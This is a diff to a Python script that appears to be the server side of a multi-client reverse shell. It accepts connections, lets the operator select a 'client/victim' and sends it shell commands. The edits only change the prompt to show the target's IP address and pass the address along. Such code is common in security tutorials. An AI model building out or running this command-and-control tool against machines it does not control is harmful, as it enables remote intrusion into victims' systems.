@@ -59,7 +59,7 @@ def accepting_connections():
             all_connections.append(conn)
             all_address.append(address)
 
-            print("\n Connection has been established :" + address[0])
+            print("\nConnection has been established :" + address[0])
 
         except:
             print("Error accepting connections")
@@ -82,9 +82,9 @@ def start_turtle():
         if cmd == 'list':
             list_connections()
         elif 'select' in cmd:
-            conn = get_target(cmd)
+            conn,addr = get_target(cmd)
             if conn is not None:
-                send_target_commands(conn)
+                send_target_commands(conn,addr)
 
         else:
             print("Command not recognized")
@@ -115,9 +115,10 @@ def get_target(cmd):
         target = cmd.replace('select ', '')  # target = id
         target = int(target)
         conn = all_connections[target]
+        address = all_address[target]
         print("You are now connected to :" + str(all_address[target][0]))
-        print(str(all_address[target][0]) + ">", end="")
-        return conn
+        # print(str(all_address[target][0]) + ">", end="")
+        return conn,address
         # 192.168.0.4> dir
 
     except:
@@ -126,16 +127,16 @@ def get_target(cmd):
 
 
 # Send commands to client/victim or a friend
-def send_target_commands(conn):
+def send_target_commands(conn,addr):
     while True:
         try:
-            cmd = input()
+            cmd = input(''+str(addr[0])+'> ')
             if cmd == 'quit':
                 break
             if len(str.encode(cmd)) > 0:
                 conn.send(str.encode(cmd))
                 client_response = str(conn.recv(20480), "utf-8")
-                print(client_response, end="")
+                print(client_response + '\n', end="")
         except:
             print("Error sending commands")
             break
